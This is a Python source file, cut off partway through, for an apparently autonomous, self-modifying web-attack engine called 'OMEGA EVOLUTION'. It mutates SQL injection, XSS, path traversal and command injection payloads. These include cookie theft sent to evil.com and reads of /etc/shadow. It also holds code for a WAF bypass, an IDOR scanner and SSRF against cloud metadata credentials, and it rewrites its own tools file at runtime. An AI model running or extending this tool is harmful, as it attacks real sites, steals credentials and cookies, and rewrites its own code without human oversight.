#!/usr/bin/env python3
"""OMEGA EVOLUTION v1.0 -- Self-Modifying Autonomous Improvement Engine
This system does NOT stay static. It evolves, creates new techniques,
writes its own code, and grows its capabilities autonomously.

SELF-MODIFICATION CAPABILITIES:
- Analyzes own failures and creates novel payloads
- Fuzzing engine with genetic algorithm mutation
- Writes new tool functions into tools.py at runtime
- Creates new technique modules autonomously
- Registers new tools into OMEGA's TOOL_MAP
- Builds a knowledge graph of what works and why
- Reproduces -- spawns new capabilities from successful techniques"""

import os, sys, re, json, time, random, hashlib, base64, urllib.parse, html, io, traceback, inspect, ast, textwrap, importlib, threading, logging
from datetime import datetime
from collections import defaultdict, Counter
from typing import List, Dict, Any, Optional, Tuple
from urllib.parse import urlparse, parse_qs, urljoin, quote, unquote

# -- Paths ------------------------------------------------------------------
OMEGA_DIR = r"D:\TERMINALCLI\omega"
TOOLS_PATH = os.path.join(OMEGA_DIR, "tools.py")
PROMPTS_PATH = os.path.join(OMEGA_DIR, "prompts.py")
HACKER_PATH = os.path.join(OMEGA_DIR, "omega_hacker.py")
EVOLUTION_PATH = os.path.join(OMEGA_DIR, "omega_evolution.py")
TECHNIQUES_DIR = os.path.join(OMEGA_DIR, "techniques")
KNOWLEDGE_PATH = os.path.join(OMEGA_DIR, "evolution_knowledge.json")

os.makedirs(TECHNIQUES_DIR, exist_ok=True)

# -- Logger -----------------------------------------------------------------
logger = logging.getLogger("omega.evolution")
logger.setLevel(logging.DEBUG)

# -- Evolution Knowledge Base -----------------------------------------------
class EvolutionKnowledge:
    """Persistent knowledge store that grows with each hacking session."""
    
    def __init__(self, path=KNOWLEDGE_PATH):
        self.path = path
        self.data = self._load()
    
    def _load(self):
        if os.path.exists(self.path):
            try:
                with open(self.path, 'r', encoding='utf-8') as f:
                    return json.load(f)
            except Exception:pass
        return {
            "techniques": {},        # technique_name -> {payloads, success_rate, targets}
            "payload_library": [],   # all payloads ever used
            "error_patterns": {},    # error_msg -> likely technology
            "response_patterns": {}, # response_pattern -> vulnerability type
            "fuzzing_results": {},   # param_name -> {values_tried, interesting_responses}
            "self_generated_tools": [], # tools the system wrote itself
            "evolution_history": [], # log of all improvements made
            "mutations": [],         # successful mutation chains
            "failures": [],          # what didn't work
            "stats": {
                "total_attacks": 0,
                "successful_exploits": 0,
                "tools_created": 0,
                "techniques_discovered": 0,
                "evolution_cycles": 0,
            }
        }
    
    def save(self):
        os.makedirs(os.path.dirname(self.path), exist_ok=True)
        with open(self.path, 'w', encoding='utf-8') as f:
            json.dump(self.data, f, indent=2, default=str)
    
    def record_attack(self, technique: str, target: str, success: bool, payload: str = "", response_indicators: dict = None):
        self.data["stats"]["total_attacks"] += 1
        if success:
            self.data["stats"]["successful_exploits"] += 1
        
        # Track by technique
        if technique not in self.data["techniques"]:
            self.data["techniques"][technique] = {"uses": 0, "successes": 0, "payloads": [], "targets": []}
        t = self.data["techniques"][technique]
        t["uses"] += 1
        if success:
            t["successes"] += 1
        if payload and payload not in t["payloads"]:
            t["payloads"].append(payload[:200])
        if target and target not in t["targets"]:
            t["targets"].append(target)
        
        # Record payload
        if payload:
            self.data["payload_library"].append({
                "technique": technique,
                "payload": payload[:200],
                "success": success,
                "target": target,
                "time": datetime.now().isoformat()
            })
        
        self.data["evolution_history"].append({
            "time": datetime.now().isoformat(),
            "type": "attack",
            "technique": technique,
            "target": target,
            "success": success,
            "payload": payload[:100] if payload else ""
        })
        
        self.save()
    
    def record_failure(self, technique: str, error: str, context: dict = None):
        self.data["failures"].append({
            "time": datetime.now().isoformat(),
            "technique": technique,
            "error": error[:300],
            "context": context or {}
        })
        self.save()
    
    def record_tool_created(self, tool_name: str, description: str, code_summary: str):
        self.data["stats"]["tools_created"] += 1
        self.data["self_generated_tools"].append({
            "name": tool_name,
            "description": description,
            "code": code_summary[:500],
            "created": datetime.now().isoformat()
        })
        self.save()
    
    def record_mutation(self, parent_technique: str, child_technique: str, payload: str, success: bool):
        self.data["mutations"].append({
            "parent": parent_technique,
            "child": child_technique,
            "payload": payload[:200],
            "success": success,
            "time": datetime.now().isoformat()
        })
        self.save()
    
    def get_best_payloads(self, technique: str, limit=5):
        """Get most successful payloads for a technique."""
        if technique not in self.data["techniques"]:
            return []
        payload_scores = defaultdict(float)
        for entry in self.data["payload_library"]:
            if entry["technique"] == technique:
                payload_scores[entry["payload"]] += 1 if entry["success"] else -0.5
        sorted_payloads = sorted(payload_scores.items(), key=lambda x: x[1], reverse=True)
        return [p for p, s in sorted_payloads[:limit]]


class TechniqueMutator:
    """Creates NEW payload variants by mutating existing working payloads.
    Uses genetic algorithm concepts: selection, crossover, mutation."""
    
    def __init__(self, knowledge: EvolutionKnowledge):
        self.knowledge = knowledge
        # Mutation operators
        self.sql_mutations = [
            lambda s: s.replace("1=1", "2=2"),
            lambda s: s.replace("'1'='1", "'2'='2"),
            lambda s: s.replace("--", "#"),
            lambda s: s.replace("#", "-- "),
            lambda s: s.replace("SLEEP(2)", "SLEEP(3)"),
            lambda s: s.replace("SLEEP(2)", "BENCHMARK(10000000,MD5(1))"),
            lambda s: s.replace("OR", "||"),
            lambda s: s.replace("AND", "&&"),
            lambda s: s.replace("1=1", "1=2 OR 1=1"),
            lambda s: s + " -- ",
            lambda s: s.replace("'", "' + '"),
            lambda s: s.upper() if random.random() > 0.7 else s,
            lambda s: re.sub(r"(?i)select", "SeLeCt", s),
            lambda s: re.sub(r"(?i)union", "UnIoN", s),
            lambda s: s.replace(" ", "/**/"),
            lambda s: s.replace(" ", "\t"),
            lambda s: s.replace("1", "1; DROP TABLE test--"),
            lambda s: "1'" + s if not s.startswith("'") else s,
        ]
        
        self.xss_mutations = [
            lambda s: s.replace("<script>", "<ScRiPt>"),
            lambda s: s.replace("alert", "prompt"),
            lambda s: s.replace("alert", "confirm"),
            lambda s: s.replace("'XSS'", "document.cookie"),
            lambda s: s.replace("img src=x", "img src=x onerror=alert(1)"),
            lambda s: s + "<!--",
            lambda s: s.replace("'XSS'", "String.fromCharCode(88,83,83)"),
            lambda s: s.replace("'", "\\'"),
            lambda s: s.replace('"', '\\"'),
            lambda s: s.replace("<svg", "<svg/onload=alert(1)"),
            lambda s: "<details open ontoggle=alert(1)>" if random.random() > 0.5 else s,
            lambda s: s.replace("alert('XSS')", "fetch('https://evil.com/'+document.cookie)"),
            lambda s: s.replace("alert('XSS')", "eval(atob('dmFyIGk9bmV3IEltYWdlKCk7aS5zcmM9J2h0dHBzOi8vZXZpbC5jb20vPycraC50ZXh0Ow=='));"),
        ]
        
        self.lfi_mutations = [
            lambda s: s.replace("../../", "..\\\\..\\\\..\\\\"),
            lambda s: s.replace("../../", "....//....//....//"),
            lambda s: s.replace("/etc/passwd", "/etc/shadow"),
            lambda s: s.replace("/etc/passwd", "/proc/self/environ"),
            lambda s: s.replace("/etc/passwd", "/proc/self/fd/0"),
            lambda s: s.replace("/etc/passwd", "/etc/issue"),
            lambda s: s.replace("/etc/passwd", "/etc/hosts"),
            lambda s: s.replace("/etc/passwd", "c:\\\\boot.ini"),
            lambda s: s.replace("php://filter/", "php://filter/zlib.deflate/"),
            lambda s: s + "%00",
            lambda s: s.replace("/etc/passwd", "/var/log/apache2/access.log"),
            lambda s: s.replace("../", "..;/"),
        ]
        
        self.cmdi_mutations = [
            lambda s: s.replace("; id", "| id"),
            lambda s: s.replace("| id", "&& id"),
            lambda s: s.replace("&& id", "|| id"),
            lambda s: s.replace("id", "whoami"),
            lambda s: s.replace("id", "cat /etc/passwd"),
            lambda s: s.replace("id", "ls -la"),
            lambda s: s.replace("id", "uname -a"),
            lambda s: s.replace("id", "ipconfig"),
            lambda s: s.replace(";", "%3B"),
            lambda s: s.replace("|", "%7C"),
            lambda s: s.replace("`id`", "$(id)"),
            lambda s: s.replace("$(id)", "`id`"),
            lambda s: "\n" + s.lstrip(";").lstrip("|").lstrip("&"),
            lambda s: s.replace(" ", "${IFS}"),
            lambda s: "echo " + s,
        ]
    
    def mutate_sql(self, payload: str) -> str:
        f = random.choice(self.sql_mutations)
        try: return f(payload)
        except Exception: return payload
    
    def mutate_xss(self, payload: str) -> str:
        f = random.choice(self.xss_mutations)
        try: return f(payload)
        except Exception: return payload
    
    def mutate_lfi(self, payload: str) -> str:
        f = random.choice(self.lfi_mutations)
        try: return f(payload)
        except Exception: return payload
    
    def mutate_cmdi(self, payload: str) -> str:
        f = random.choice(self.cmdi_mutations)
        try: return f(payload)
        except Exception: return payload
    
    def crossover(self, payload1: str, payload2: str) -> str:
        """Combine two payloads into one."""
        if len(payload1) < 3 or len(payload2) < 3:
            return payload1
        split1 = len(payload1) // 2
        split2 = len(payload2) // 2
        return payload1[:split1] + payload2[split2:]
    
    def generate_novel_sql_payload(self, base_payloads: list) -> str:
        """Generate a completely novel SQL payload using genetic combination."""
        if not base_payloads:
            return "' OR 1=1--"
        # Select two parents
        p1 = random.choice(base_payloads)
        p2 = random.choice(base_payloads)
        # Crossover
        child = self.crossover(p1, p2)
        # Multiple mutations
        for _ in range(random.randint(1, 3)):
            child = self.mutate_sql(child)
        return child
    
    def generate_novel_xss_payload(self, base_payloads: list) -> str:
        if not base_payloads:
            return "<script>alert(1)</script>"
        p1 = random.choice(base_payloads)
        p2 = random.choice(base_payloads)
        child = self.crossover(p1, p2)
        for _ in range(random.randint(1, 3)):
            child = self.mutate_xss(child)
        return child
    
    def generate_novel_lfi_payload(self, base_payloads: list) -> str:
        if not base_payloads:
            return "../../../../etc/passwd"
        p = random.choice(base_payloads)
        for _ in range(random.randint(1, 3)):
            p = self.mutate_lfi(p)
        return p
    
    def generate_novel_cmdi_payload(self, base_payloads: list) -> str:
        if not base_payloads:
            return "; id"
        p = random.choice(base_payloads)
        for _ in range(random.randint(1, 3)):
            p = self.mutate_cmdi(p)
        return p

    def generate_fuzzing_payloads(self, technique: str, count: int = 20) -> List[str]:
        """Generate N novel payloads for a given technique."""
        payloads = []
        base = self.knowledge.get_best_payloads(technique, 5)
        
        if technique == "sqli":
            generator = self.generate_novel_sql_payload
        elif technique == "xss":
            generator = self.generate_novel_xss_payload
        elif technique == "lfi":
            generator = self.generate_novel_lfi_payload
        elif technique == "cmdi":
            generator = self.generate_novel_cmdi_payload
        else:
            return base
        
        for _ in range(count):
            payloads.append(generator(base))
        
        return payloads


class ToolSynthesizer:
    """AUTONOMOUS TOOL CREATION -- Writes new Python code and registers it.
    This is the reproductive system. It spawns new capabilities."""
    
    def __init__(self, knowledge: EvolutionKnowledge):
        self.knowledge = knowledge
    
    def synthesize_waf_bypass(self) -> Dict:
        """Create new WAF bypass techniques and write them as tools."""
        # Analyze known WAFs and create bypasses
        bypasses = {
            "cloudflare_bypass": {
                "description": "Cloudflare WAF bypass using original IP via direct-connect subdomains",
                "code": '''
def cloudflare_bypass(target_url, timeout=10):
    """Bypass Cloudflare by finding origin IP through subdomain enumeration."""
    import socket, requests
    hostname = target_url.replace("https://","").replace("http://","").split("/")[0]
    
    # Try common CDN-bypass techniques
    check_methods = [
        ("Direct IP via DNS history", f"https://{hostname}"),
        ("Subdomain brute", f"direct.{hostname}"),
        ("Alternative port", f"https://{hostname}:8443"),
        ("IPv6 bypass", f"https://{hostname}"),
    ]
    
    for name, url in check_methods:
        try:
            r = requests.get(url, timeout=timeout, verify=False, 
                headers={"Host": hostname, "User-Agent": "Mozilla/5.0"})
            if r.status_code == 200 and "cloudflare" not in r.text[:500].lower():
                return {"bypass": True, "method": name, "url": url, "status": r.status_code}
        except Exception:pass
    
    # Try to find origin IP via SecurityTrails/Censys simulation
    try:
        subdomains = ["direct", "origin", "cdn", "server", "ns1", "ns2", "mail", "webmail", "ftp"]
        for sub in subdomains:
            try:
                ip = socket.gethostbyname(f"{sub}.{hostname}")
                test_url = f"https://{ip}"
                r = requests.get(test_url, timeout=timeout, verify=False,
                    headers={"Host": hostname})
                if r.status_code in [200, 301, 302, 401, 403]:
                    return {"bypass": True, "method": f"Origin via subdomain {sub}", "ip": ip, "url": test_url}
            except Exception:pass
    except Exception:pass
    
    return {"bypass": False, "message": "Cloudflare bypass failed"}
''',
            },
            "parameter_pollution": {
                "description": "HTTP Parameter Pollution (HPP) to bypass WAF rules",
                "code": '''
def hpp_bypass(url, vulnerable_param, original_payload, timeout=10):
    """Bypass WAF by sending multiple copies of the same parameter (HPP)."""
    import requests, urllib.parse
    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed.query)
    
    # HPP: send the payload split across multiple params
    hpp_variants = []
    
    # Variant 1: Duplicate the parameter
    if vulnerable_param in params:
        original_val = params[vulnerable_param][0]
        params2 = params.copy()
        params2[vulnerable_param] = [original_val, original_payload]
        hpp_variants.append(urllib.parse.urlencode(params2, doseq=True))
    
    # Variant 2: Parameter fragmentation
    mid = len(original_payload) // 2
    part1, part2 = original_payload[:mid], original_payload[mid:]
    params3 = params.copy()
    params3[f"{vulnerable_param}1"] = [part1]
    params3[f"{vulnerable_param}2"] = [part2]
    hpp_variants.append(urllib.parse.urlencode(params3, doseq=True))
    
    # Variant 3: URL-encoded parameter name
    params4 = params.copy()
    params4[urllib.parse.quote(vulnerable_param)] = [original_payload]
    hpp_variants.append(urllib.parse.urlencode(params4, doseq=True))
    
    results = []
    for qs in hpp_variants:
        test_url = parsed._replace(query=qs).geturl()
        try:
            r = requests.get(test_url, timeout=timeout, verify=False)
            results.append({"url": test_url[:200], "status": r.status_code, "size": len(r.content)})
        except Exception:pass
    
    return results
''',
            }
        }
        
        return bypasses
    
    def synthesize_idor_scanner(self) -> Dict:
        """Generate an Insecure Direct Object Reference scanner tool."""
        return {
            "idor_scanner": {
                "description": "IDOR vulnerability scanner that tests sequential IDs",
                "code": '''
def scan_idor(base_url, id_param="id", id_range=(1, 100), auth_cookie="", timeout=10):
    """Scan for Insecure Direct Object Reference vulnerabilities.
    Tests sequential IDs and looks for unauthorized access patterns."""
    import requests, urllib.parse
    
    results = {"vulnerable_endpoints": [], "tested": 0, "accessible": 0}
    cookies = {}
    if auth_cookie:
        cookies = {"session": auth_cookie}
    
    for i in range(id_range[0], id_range[1] + 1):
        try:
            url = base_url.replace(f"{{{id_param}}}", str(i)) if "{" in base_url else base_url + f"?{id_param}={i}"
            r = requests.get(url, cookies=cookies, timeout=timeout, verify=False, allow_redirects=False)
            results["tested"] += 1
            
            # Check if this ID returns different content than anonymous
            if r.status_code == 200:
                results["accessible"] += 1
                results["vulnerable_endpoints"].append({
                    "url": url[:200],
                    "status": r.status_code,
                    "size": len(r.content),
                    "id": i,
                    "has_auth_bypass": "login" not in r.text.lower() and "unauthorized" not in r.text.lower()
                })
        except Exception:pass
    
    # Filter for likely IDORs (accessible without auth)
    vulnerable = [e for e in results["vulnerable_endpoints"] if e.get("has_auth_bypass")]
    results["likely_idors"] = vulnerable[:10]
    return results
''',
            }
        }
    
    def synthesize_ssrf_exploit(self) -> Dict:
        """Create advanced SSRF exploitation tool."""
        return {
            "ssrf_deep_exploit": {
                "description": "Deep SSRF exploitation engine targeting cloud metadata, internal services, and RCE via SSRF",
                "code": '''
def ssrf_deep_exploit(url, param, timeout=15):
    """Deep SSRF exploitation - targets cloud metadata, internal services, 
    and attempts SSRF-to-RCE via internal APIs."""
    import requests, urllib.parse, json
    
    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed.query)
    results = {"cloud_metadata": {}, "internal_services": [], "rce_attempts": []}
    
    # AWS Metadata endpoints to try
    aws_paths = [
        "/latest/meta-data/", "/latest/meta-data/iam/security-credentials/",
        "/latest/user-data/", "/latest/meta-data/public-keys/",
        "/latest/meta-data/iam/info/", "/latest/dynamic/instance-identity/document/",
        "/latest/meta-data/placement/availability-zone/",
    ]
    
    # GCP Metadata
    gcp_paths = [
        "/computeMetadata/v1/", "/computeMetadata/v1/instance/service-accounts/",
        "/computeMetadata/v1/instance/", "/computeMetadata/v1/project/",
    ]
    
    # Internal services to probe
    internal_targets = [
        ("Redis", "http://127.0.0.1:6379/"),
        ("MySQL", "http://127.0.0.1:3306/"),
        ("PostgreSQL", "http://127.0.0.1:5432/"),
        ("Elasticsearch", "http://127.0.0.1:9200/"),
        ("Docker", "http://127.0.0.1:2375/containers/json"),
        ("Kubernetes", "http://127.0.0.1:10255/"),
        ("Consul", "http://127.0.0.1:8500/v1/agent/members"),
        ("Vault", "http://127.0.0.1:8200/v1/secret/"),
    ]
    
    for label, paths in [("AWS", aws_paths), ("GCP", gcp_paths)]:
        for path in paths:
            target_url_str = f"http://169.254.169.254{path}" if label == "AWS" else f"http://metadata.google.internal{path}"
            tp = params.copy()
            tp[param] = [target_url_str]
            nq = urllib.parse.urlencode(tp, doseq=True)
            tu = parsed._replace(query=nq).geturl()
            try:
                headers = {"Metadata-Flavor": "Google"} if label == "GCP" else {}
                r = requests.get(tu, headers=headers, timeout=timeout, verify=False)
                if r.status_code == 200 and len(r.text) > 10:
                    results["cloud_metadata"][f"{label}{path}"] = r.text[:500]
            except Exception:pass
    
    for service_name, internal_url in internal_targets:
        tp = params.copy()
        tp[param] = [internal_url]
        nq = urllib.parse.urlencode(tp, doseq=True)
        tu = parsed._replace(query=nq).geturl()
        try:
            r = requests.get(tu, timeout=timeout, verify=False)
            if r.status_code in [200, 201, 401, 403] and len(r.text) > 20:
                results["internal_services"].append({"service": service_name, "url": internal_url, "response": r.text[:200]})
        except Exception:pass
    
    return results
''',
            }
        }
    
    def write_tool_to_tools_py(self, tool_name: str, wrapper_function: str) -> bool:
        """Write a new tool function into tools.py and register it in TOOL_MAP."""
        try:
            # Read tools.py
            with open(TOOLS_PATH, 'r', encoding='utf-8') as f:
                content = f.read()
            
            # Find the TOOL_MAP.update line
            update_marker = "TOOL_MAP.update"
            last_update = content.rfind(update_marker)
            
            if last_update == -1:
                return False
            
            # Find the end of the update dict
            dict_end = content.find(")\n", last_update)
            
            # Insert new tool entry before the closing of the dict
            # Find the last entry in _HACKER_TOOLS
            insert_pos = content.rfind("}", 0, dict_end)
            if insert_pos == -1:
                return False
            
            # Add the new tool entry
            new_entry = f'\n    "{tool_name}": {tool_name}_tool,'
            content = content[:insert_pos] + new_entry + content[insert_pos:]
            
            # Add the wrapper function before the TOOL_MAP.update
            # Find a good insert point
            last_func = content.rfind("def ", 0, content.rfind(update_marker))
            insert_after = content.find("\n\n", last_func)
            if insert_after != -1:
                content = content[:insert_after] + "\n\n" + wrapper_function + content[insert_after:]
            
            with open(TOOLS_PATH, 'w', encoding='utf-8') as f:
                f.write(content)
            
            self.knowledge.record_tool_created(tool_name, "Self-synthesized tool", wrapper_function[:200])
            
            # Force reload
            try:
                import tools
                importlib.reload(tools)
            except Exception:pass
            
            return True
        except Exception as e:
            logger.debug(f"  [ERROR] Failed to write tool: {e}")
            return False
    
    def create_technique_file(self, technique_name: str, category: str, code: str) -> bool:
        """Create a new technique file in the techniques directory."""
        try:
            path = os.path.join(TECHNIQUES_DIR, f"{technique_name}.py")
            header = f'''#!/usr/bin/env python3
"""OMEGA EVOLVED TECHNIQUE: {technique_name}
Category: {category}
Self-generated on: {datetime.now().isoformat()}
This technique was autonomously created by OMEGA's evolution engine.
"""

'''
            with open(path, 'w', encoding='utf-8') as f:
                f.write(header + code)
            
            self.knowledge.data["stats"]["techniques_discovered"] += 1
            self.knowledge.save()
            return True
        except Exception as e:
            logger.debug(f"  [ERROR] Failed to create technique file: {e}")
            return False


class PayloadFuzzer:
    """Autonomous parameter fuzzer that learns from responses.
    Uses response analysis to generate smarter follow-up payloads."""
    
    def __init__(self, knowledge: EvolutionKnowledge):
        self.knowledge = knowledge
        self.session = None
    
    def _get_session(self):
        if self.session is None:
            import requests
            self.session = requests.Session()
            self.session.verify = False
            self.session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
        return self.session
    
    def fuzz_parameter(self, url: str, param: str, base_value: str = "1", technique: str = "generic") -> List[Dict]:
        """Fuzz a parameter with evolving payloads and analyze responses."""
        import requests
        session = self._get_session()
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        results = []
        mutator = TechniqueMutator(self.knowledge)
        
        # Generate fuzzing payloads based on technique
        if technique == "sqli":
            test_payloads = ["'", '"', "' OR '1'='1", "' AND 1=1--", "' UNION SELECT NULL--", "',", "'/*", "';"]
            test_payloads += mutator.generate_fuzzing_payloads("sqli", 10)
        elif technique == "xss":
            test_payloads = ["<script>alert(1)</script>", "<img src=x>", "{{7*7}}", "${7*7}", "<%=7*7%>"]
            test_payloads += mutator.generate_fuzzing_payloads("xss", 10)
        elif technique == "lfi":
            test_payloads = ["../", "../../etc/passwd", "....//....//etc/passwd", "%2e%2e%2fetc/passwd"]
            test_payloads += mutator.generate_fuzzing_payloads("lfi", 10)
        elif technique == "cmdi":
            test_payloads = [";id", "|id", "`id`", "$(id)", "&&id"]
            test_payloads += mutator.generate_fuzzing_payloads("cmdi", 10)
        else:
            # Generic fuzzing with common test strings
            test_payloads = [
                "test", "'", '"', "../", ";", "|", "<", ">", "{", "}", "$",
                "%00", "%0a", "%0d", "null", "undefined", "true", "false",
                "1", "0", "-1", "999999999999999", "1e10",
                "admin", "root", "administrator",
            ]
        
        for payload in test_payloads:
            try:
                test_params = params.copy()
                if param in test_params:
                    test_params[param] = [base_value + payload]
                else:
                    test_params[param] = [payload]
                
                new_query = urllib.parse.urlencode(test_params, doseq=True)
                test_url = parsed._replace(query=new_query).geturl()
                
                start = time.time()
                resp = session.get(test_url, timeout=10, allow_redirects=False)
                elapsed = time.time() - start
                
                # Analyze response for interesting indicators
                interesting = False
                indicators = {}
                
                # Check response size anomalies
                if resp.status_code != 200 and resp.status_code not in [301, 302, 404]:
                    interesting = True
                    indicators["status_anomaly"] = resp.status_code
                
                # Check timing (potential time-based injection)
                if elapsed > 3.0:
                    interesting = True
                    indicators["timing"] = f"{elapsed:.1f}s"
                
                # Check for error messages
                error_sigs = ["error", "warning", "exception", "fatal", "syntax", "unexpected",
                            "mysql", "sql", "ora-", "driver", "db2", "postgresql", "microsoft ole db"]
                for sig in error_sigs:
                    if sig in resp.text.lower():
                        interesting = True
                        indicators["error"] = sig
                        break
                
                # Check for reflected content
                if payload in resp.text:
                    interesting = True
                    indicators["reflection"] = True
                
                if interesting:
                    results.append({
                        "payload": payload[:100],
                        "status": resp.status_code,
                        "size": len(resp.content),
                        "time": f"{elapsed:.1f}s",
                        "indicators": indicators,
                        "url": test_url[:200],
                    })
                
                resp.close()
            except Exception:
                continue
        
        return results
    
    def deep_parameter_analysis(self, url: str, param: str) -> Dict:
        """Deep analysis of a parameter - tries to determine its purpose and vulnerabilities."""
        session = self._get_session()
        results = {"param": param, "type": "unknown", "vulnerabilities": [], "responses": []}
        
        # Test different value types to infer parameter type
        test_values = [
            ("numeric", "123"),
            ("string", "test"),
            ("boolean", "true"),
            ("email", "test@test.com"),
            ("url", "https://example.com"),
            ("uuid", "550e8400-e29b-41d4-a716-446655440000"),
            ("json", '{"test":1}'),
            ("empty", ""),
            ("null", "null"),
            ("special", "<>'\";(){}[]"),
        ]
        
        for val_type, value in test_values:
            try:
                parsed = urlparse(url)
                params = parse_qs(parsed.query)
                test_params = params.copy()
                test_params[param] = [value]
                new_query = urllib.parse.urlencode(test_params, doseq=True)
                test_url = parsed._replace(query=new_query).geturl()
                
                resp = session.get(test_url, timeout=10, allow_redirects=False)
                results["responses"].append({
                    "value_type": val_type,
                    "value": value[:50],
                    "status": resp.status_code,
                    "size": len(resp.content),
                    "body_preview": resp.text[:100]
                })
                resp.close()
            except Exception:
                continue
        
        # Analyze response patterns to determine parameter type
        responses = results["responses"]
        if responses:
            # Check if numeric values cause different responses
            numeric_resp = next((r for r in responses if r["value_type"] == "numeric"), None)
            default_resp = next((r for r in responses if r["value_type"] == "string"), None)
            empty_resp = next((r for r in responses if r["value_type"] == "empty"), None)
            
            if empty_resp and empty_resp["status"] == 400:
                results["type"] = "required_field"
            elif numeric_resp and default_resp and numeric_resp["size"] != default_resp["size"]:
                results["type"] = "likely_numeric_id"
                results["vulnerabilities"].append("IDOR potential - try sequential IDs")
            if any(r["status"] in [500, 501, 502, 503] for r in responses):
                results["vulnerabilities"].append("Error handling - may be exploitable")
            if any(r["status"] in [200, 201] and r["size"] > 0 for r in responses if r["value_type"] == "special"):
                results["vulnerabilities"].append("Special chars accepted - potential injection point")
        
        return results


class EvolutionKernel:
    """MASTER EVOLUTION ENGINE -- The core self-improvement loop.
    Runs autonomously, learns from outcomes, creates new techniques."""
    
    def __init__(self):
        self.knowledge = EvolutionKnowledge()
        self.mutator = TechniqueMutator(self.knowledge)
        self.synthesizer = ToolSynthesizer(self.knowledge)
        self.fuzzer = PayloadFuzzer(self.knowledge)
        self.running = False
        self.stats = {
            "cycles": 0,
            "techniques_created": 0,
            "payloads_generated": 0,
            "tools_written": 0,
            "mutations_tested": 0,
        }
    
    def evolve(self, target_url: str = None, cycles: int = 3):
        """Run the evolution loop - hack, learn, create, improve, repeat."""
        self.running = True
        cycle = 0
        
        logger.debug("\n" + "=" * 65)
        logger.debug(f"  OMEGA EVOLUTION ENGINE v1.0 -- INITIALIZED")
        logger.debug(f"  Self-Improvement Loop Active -- {cycles} cycles")
        logger.debug("=" * 65 + "\n")
        
        while cycle < cycles and self.running:
            cycle += 1
            self.stats["cycles"] = cycle
            self.knowledge.data["stats"]["evolution_cycles"] = cycle
            
            logger.debug(f"\n{Fore.MAGENTA}=== EVOLUTION CYCLE {cycle}/{cycles} ==={Style.RESET_ALL}")
            
            # -- Step 1: RUN HACKING OPERATIONS --
            if target_url:
                logger.debug(f"\n{Fore.YELLOW}[Step 1] Hacking: {target_url}{Style.RESET_ALL}")
                self._run_hacking_cycle(target_url)
            
            # -- Step 2: ANALYZE KNOWLEDGE --
            logger.debug(f"\n{Fore.YELLOW}[Step 2] Analyzing knowledge base...{Style.RESET_ALL}")
            self._analyze_and_learn()
            
            # -- Step 3: GENERATE NOVEL TECHNIQUES --
            logger.debug(f"\n{Fore.YELLOW}[Step 3] Generating novel techniques...{Style.RESET_ALL}")
            self._generate_new_techniques()
            
            # -- Step 4: WRITE NEW TOOLS --
            logger.debug(f"\n{Fore.YELLOW}[Step 4] Writing new tools into OMEGA...{Style.RESET_ALL}")
            self._synthesize_new_tools()
            
            # -- Step 5: TEST NEW TECHNIQUES --
            logger.debug(f"\n{Fore.YELLOW}[Step 5] Testing new techniques...{Style.RESET_ALL}")
            if target_url:
                self._test_new_techniques(target_url)
            
            # -- Step 6: EVOLVE --
            logger.debug(f"\n{Fore.YELLOW}[Step 6] Recording evolution...{Style.RESET_ALL}")
            self._log_evolution_state()
            
            logger.debug(f"\n{Fore.GREEN}=== CYCLE {cycle} COMPLETE ==={Style.RESET_ALL}")
        
        self.running = False
        logger.debug(f"\n{Fore.MAGENTA}{'='*65}")
        logger.debug(f"  EVOLUTION COMPLETE -- {cycles} cycles executed")
        logger.debug(f"  Knowledge base: {len(self.knowledge.data['payload_library'])} payloads")
        logger.debug(f"  Tools created: {self.knowledge.data['stats']['tools_created']}")
        logger.debug(f"  Techniques discovered: {self.knowledge.data['stats']['techniques_discovered']}")
        logger.debug(f"  Total attacks recorded: {self.knowledge.data['stats']['total_attacks']}")
        logger.debug(f"  Success rate: {self._success_rate():.1f}%")
        logger.debug(f"{'='*65}{Style.RESET_ALL}\n")
        
        return self.knowledge.data["stats"]
    
    def _run_hacking_cycle(self, target_url):
        """Execute hacking operations and record results."""
        try:
            sys.path.insert(0, OMEGA_DIR)
            from omega_hacker import scan_ports, detect_technologies, scan_sqli, scan_xss, scan_lfi, scan_cmdi, scan_ssrf, scan_ssti, scan_xxe, scan_cors, scan_open_redirect
            
            hostname = urlparse(target_url).hostname or target_url
            
            # Port scan
            ports = scan_ports(hostname, timeout=2)
            for p, s in ports:
                self.knowledge.record_attack("port_scan", target_url, True, f"{p}:{s}")
            
            # Technology detection
            techs = detect_technologies(target_url)
            self.knowledge.record_attack("tech_detect", target_url, bool(techs), str(list(techs.keys())[:3]))
            
            # Test if URL has parameters
            parsed = urlparse(target_url)
            if parsed.query:
                # SQLi
                sqli_results = scan_sqli(target_url)
                for r in sqli_results:
                    self.knowledge.record_attack("sqli", target_url, True, r.get("payload_name", ""))
                    if r.get("confidence", 0) > 0.5:
                        self.knowledge.record_attack("sqli_exploit", target_url, True, r.get("type", ""))
                
                # XSS
                xss_results = scan_xss(target_url)
                for r in xss_results:
                    self.knowledge.record_attack("xss", target_url, True, r.get("payload", ""))
                
                # LFI
                lfi_results = scan_lfi(target_url)
                for r in lfi_results:
                    self.knowledge.record_attack("lfi", target_url, True, r.get("payload", ""))
                
                # CMDI
                cmdi_results = scan_cmdi(target_url)
                for r in cmdi_results:
                    self.knowledge.record_attack("cmdi", target_url, True, r.get("payload", ""))
                
                # SSRF
                ssrf_results = scan_ssrf(target_url)
                for r in ssrf_results:
                    self.knowledge.record_attack("ssrf", target_url, True, r.get("type", ""))
                
                # SSTI
                ssti_results = scan_ssti(target_url)
                for r in ssti_results:
                    self.knowledge.record_attack("ssti", target_url, True, r.get("payload", ""))
            
            # CORS
            cors_results = scan_cors(target_url)
            for r in cors_results:
                self.knowledge.record_attack("cors", target_url, True, r.get("type", ""))
            
            # Open redirect
            redirect_results = scan_open_redirect(target_url)
            for r in redirect_results:
                self.knowledge.record_attack("open_redirect", target_url, True, r.get("parameter", ""))
            
            logger.debug(f"  [OK] Hacking cycle completed for {target_url}")
            
        except Exception as e:
            logger.debug(f"  [ERROR] Hacking cycle failed: {e}")
            self.knowledge.record_failure("hacking_cycle", str(e), {"target": target_url})
    
    def _analyze_and_learn(self):
        """Analyze knowledge base to identify patterns and gaps."""
        k = self.knowledge.data
        
        # Identify successful techniques
        successful = []
        for tech, data in k["techniques"].items():
